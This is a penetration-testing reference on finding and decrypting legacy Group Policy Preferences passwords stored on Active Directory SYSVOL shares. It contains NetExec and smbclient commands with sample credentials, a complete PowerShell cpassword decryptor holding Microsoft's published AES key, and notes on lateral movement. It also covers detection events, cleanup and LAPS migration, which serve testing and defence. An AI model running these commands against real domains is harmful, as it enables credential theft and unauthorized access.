# Group Policy Preferences (GPP) Passwords

Extract credentials stored in legacy Group Policy Preferences XML files on SYSVOL shares.
Although patched in 2014, GPP passwords are still commonly found in older environments and provide easy wins.

## Quick Reference

```bash
# NetExec GPP module
nxc smb 172.16.5.5 -u user -p password -M gpp_password

# Manual search for Groups.xml
smbclient //172.16.5.5/SYSVOL -U user%password -c 'recurse; ls Groups.xml'

# Decrypt cpassword
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

## What are GPP Passwords?

Group Policy Preferences allowed administrators to create policies with embedded credentials. These credentials were stored in XML files on SYSVOL with AES-256 encryption, but Microsoft published the decryption key on MSDN.

### Vulnerable GPP Files

| File | Purpose | Contains |
|------|---------|----------|
| Groups.xml | Local group management | Local admin passwords |
| Services.xml | Service configuration | Service account passwords |
| Scheduledtasks.xml | Scheduled tasks | Account passwords |
| DataSources.xml | Database connections | Database passwords |
| Printers.xml | Printer configuration | Printer passwords |
| Drives.xml | Mapped drives | Drive mapping credentials |

## Automated Discovery

### NetExec Modules

```bash
# List GPP-related modules
nxc smb -L | grep gpp

# Search for GPP passwords
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password

# Search for GPP autologin
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

### Get-GPPPassword (PowerShell)

```powershell
# PowerSploit module
Import-Module .\PowerSploit.ps1
Get-GPPPassword

# Output includes:
# - Username
# - Password (decrypted)
# - Changed date
# - File path
```

## Manual Discovery

### Search SYSVOL

```bash
# Connect to SYSVOL
smbclient //172.16.5.5/SYSVOL -U domain/user%password

# Search for XML files
smb: \> recurse ON
smb: \> prompt OFF
smb: \> ls Groups.xml
smb: \> ls *.xml

# Download Groups.xml
smb: \> get domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
```

### Search from Windows

```powershell
# Search SYSVOL for XML files
Get-ChildItem -Path "\\domain.local\SYSVOL" -Recurse -Include *.xml -ErrorAction SilentlyContinue

# Search for cpassword attribute
findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml

# PowerShell search
Get-ChildItem -Path "\\domain.local\SYSVOL" -Recurse -Include *.xml | Select-String -Pattern "cpassword"
```

## Decryption

### gpp-decrypt (Linux)

```bash
# Decrypt cpassword value
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

# Output
Password1
```

### PowerShell Decryption

```powershell
function Get-DecryptedCpassword {
    [CmdletBinding()]
    Param (
        [string] $Cpassword
    )
    
    try {
        $Mod = ($Cpassword.length % 4)
        switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
        }
        
        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
        
        $AesIV = New-Object Byte[]($AesObject.IV.Length)
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor()
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
        
        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    }
    catch {Write-Error $Error[0]}
}

# Usage
Get-DecryptedCpassword "VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE"
```

## Example Groups.xml File

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

## Common Locations

### SYSVOL Paths

```
\\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
\\domain.local\SYSVOL\domain.local\Policies\{GUID}\User\Preferences\Groups\Groups.xml
\\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Services\Services.xml
\\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
\\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\DataSources\DataSources.xml
```

### Local Cache

```
C:\ProgramData\Microsoft\Group Policy\History\{GUID}\Machine\Preferences\Groups\Groups.xml
C:\Users\<username>\AppData\Local\Microsoft\Group Policy\History\{GUID}\Machine\Preferences\Groups\Groups.xml
```

## Exploitation Scenarios

### Local Administrator Password

```xml
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
      name="Administrator" 
      cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" 
      changeLogon="0" 
      noChange="1" 
      neverExpires="1" 
      acctDisabled="0" 
      userName="Administrator"/>
```

Decrypt and use for local admin access across domain.

### Service Account Password

```xml
<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" 
           name="MyService" 
           image="2" 
           changed="2018-07-18 20:46:06">
  <Properties startupType="Automatic" 
              serviceName="MyService" 
              timeout="30" 
              accountName="domain\svc_account" 
              cpassword="VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE"/>
</NTService>
```

Decrypt and use service account for lateral movement.

### Scheduled Task Credentials

```xml
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
  <Task clsid="{2DEFF6E5-E354-4c82-B180-B8A33F7A1B9C}" 
        name="Backup Task" 
        image="0" 
        changed="2018-07-18 20:46:06">
    <Properties action="C" 
                name="Backup Task" 
                runAs="domain\backup_admin" 
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"/>
  </Task>
</ScheduledTasks>
```

## Notes

### MS14-025 Patch

Microsoft released [MS14-025](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30) in May 2014 to prevent administrators from setting passwords using GPP.

**What the patch does:**
- Prevents creation of new GPP with passwords
- Does NOT remove existing Groups.xml files
- Does NOT delete cached local copies

**What the patch does NOT do:**
- Remove existing GPP passwords from SYSVOL
- Clear cached GPP files on endpoints
- Decrypt or alert on existing passwords

### Why Still Relevant

GPP passwords are still found because:
- Patch only prevents new passwords, doesn't remove old ones
- Administrators must manually delete XML files
- Cached copies remain on endpoints
- Many organizations never cleaned up after patch
- Legacy systems may not be patched

### Detection

GPP password access generates:
- Event ID 5140 (Network share accessed) for SYSVOL
- Event ID 5145 (Detailed file share) for XML file access
- Unusual SYSVOL enumeration patterns
- Multiple XML file reads in short timeframe

### Published AES Key

Microsoft published the AES-256 key on MSDN:
```
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

This makes all GPP passwords trivially decryptable.

### Common Passwords Found

Frequently discovered in GPP:
- Local administrator passwords
- Service account passwords
- Backup account passwords
- SQL service accounts
- Scheduled task credentials
- Mapped drive credentials

### Cached Copies

Even if deleted from SYSVOL, cached copies may exist:
- `C:\ProgramData\Microsoft\Group Policy\History\`
- `C:\Users\*\AppData\Local\Microsoft\Group Policy\History\`
- `C:\Windows\System32\GroupPolicy\`

Search these locations on compromised systems.

### Cleanup Recommendations

For clients:
1. Delete all GPP XML files from SYSVOL
2. Clear Group Policy cache on all endpoints
3. Change all passwords that were in GPP
4. Implement LAPS for local admin passwords
5. Use gMSA for service accounts
6. Monitor SYSVOL access
7. Regular audits for GPP files

### Alternative Credential Storage

Recommend to clients:
- **LAPS** (Local Administrator Password Solution) for local admin passwords
- **gMSA** (Group Managed Service Accounts) for service accounts
- **Azure Key Vault** for application secrets
- **CyberArk/Thycotic** for privileged account management
- Never store passwords in Group Policy

### Mitigation

Immediate actions:
```powershell
# Find all GPP XML files
Get-ChildItem -Path "\\domain.local\SYSVOL" -Recurse -Include *.xml | Select-String -Pattern "cpassword"

# Delete Groups.xml files
Remove-Item "\\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml"

# Force Group Policy update on all systems
Invoke-GPUpdate -Computer * -Force

# Change all affected passwords
```

### LAPS Implementation

Replace GPP with LAPS:
1. Install LAPS on domain controllers
2. Extend AD schema for LAPS attributes
3. Create GPO to enable LAPS
4. Configure password complexity and rotation
5. Delegate read access to help desk
6. Remove old GPP policies

### Verification

Confirm cleanup:
```powershell
# Verify no cpassword attributes in SYSVOL
Get-ChildItem -Path "\\domain.local\SYSVOL" -Recurse -Include *.xml | Select-String -Pattern "cpassword" | Measure-Object

# Should return Count: 0
```

### Historical Context

GPP passwords were introduced in Windows Server 2008 to simplify password management. The feature was widely adopted before the security implications were understood. The published AES key made all stored passwords instantly crackable, leading to the 2014 patch.
